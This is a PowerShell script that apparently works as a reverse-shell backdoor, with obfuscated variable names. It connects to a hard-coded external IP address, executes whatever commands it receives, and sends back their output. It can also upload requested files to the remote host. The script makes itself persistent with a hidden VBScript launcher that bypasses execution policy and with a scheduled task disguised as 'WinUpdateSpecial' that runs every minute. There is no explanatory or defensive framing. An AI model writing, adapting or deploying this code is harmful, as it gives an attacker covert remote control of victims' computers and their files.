$code = @'
while ($true) {
    try {
        $xDVlCvoMdHgpL = New-Object System.Net.Sockets.TCPClient('4.211.159.98', 443)
        if ($xDVlCvoMdHgpL.Connected) {
            $VrH5Qud0LjAtoh67B = $xDVlCvoMdHgpL.GetStream()
            $wfAa7Iy8HZOUl = [DateTime]::Now

            while ($xDVlCvoMdHgpL.Connected) {
                [byte[]]$6JqXwPG5R4fcvnCgWS = 0..65535 | ForEach-Object { 0 }  
                $EdzR = $VrH5Qud0LjAtoh67B.Read($6JqXwPG5R4fcvnCgWS, 0, $6JqXwPG5R4fcvnCgWS.Length)   

                if ($EdzR -gt 0) {
                    $wfAa7Iy8HZOUl = [DateTime]::Now  
                    $DvVYDoMWkxivVmY = [System.Text.Encoding]::ASCII.GetString($6JqXwPG5R4fcvnCgWS, 0, $EdzR)  

                    
                    if ($DvVYDoMWkxivVmY -match "^download\s+(.+)") {
                        $5gYpZHIWOjD4k = $xI5kr[1]
                        if (Test-Path $5gYpZHIWOjD4k -PathType Leaf) {
                            $SxnAbv51nGA4w = [System.IO.File]::ReadAllBytes($5gYpZHIWOjD4k)
                            $VrH5Qud0LjAtoh67B.Write($SxnAbv51nGA4w, 0, $SxnAbv51nGA4w.Length)
                            $VrH5Qud0LjAtoh67B.Flush()
                        } else {
                            $VrH5Qud0LjAtoh67B.Write([System.Text.Encoding]::ASCII.GetBytes("File not found."), 0, 14)
                            $VrH5Qud0LjAtoh67B.Flush()
                        }
                    } else {
                        $XCkVf7Nw8ybBcj2D3nvA1HI = Invoke-Expression ". { $DvVYDoMWkxivVmY } 2>&1" | Out-String    
                        $AuOT = $XCkVf7Nw8ybBcj2D3nvA1HI + 'PS ' + (Get-Location).Path + '> '      
                        $uDZ45ItzUDV = [System.Text.Encoding]::ASCII.GetBytes($AuOT)   
                        $VrH5Qud0LjAtoh67B.Write($uDZ45ItzUDV, 0, $uDZ45ItzUDV.Length)                    
                        $VrH5Qud0LjAtoh67B.Flush()                                                  
                    }
                }

                $Bk8e5o = [DateTime]::Now - $wfAa7Iy8HZOUl
                if ($Bk8e5o.TotalMinutes -ge 2) {
                    $xDVlCvoMdHgpL.Close()
                    break  
                }
            }

            $xDVlCvoMdHgpL.Close()  
        }
    } catch {
        Start-Sleep -Seconds 10  
    }
}

# This is a commentdas in PowerShell

'@


$programsFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Programs)


$scriptPath = Join-Path $programsFolder "script.ps1"
$code | Out-File -FilePath $scriptPath -Encoding ascii


$startupFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Programs)


$batchScriptPath = Join-Path $startupFolder "run.vbs"
$batchCode = @"
' Create a Shell object
Set objShell = CreateObject("WScript.Shell")


WScript.Sleep 5000

' Path to the PowerShell script comons
scriptPath = "$scriptPath"


' Command to run PowerShell script in hidden mode
command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & scriptPath & """"

' Execute the command and capture return value
returnValue = objShell.Run(command, 0, True)
"@
$batchCode | Out-File -FilePath $batchScriptPath -Encoding ascii


schtasks /Create /SC minute /mo 1 /TN "WinUpdateSpecial" /TR "wscript.exe '$batchScriptPath'"







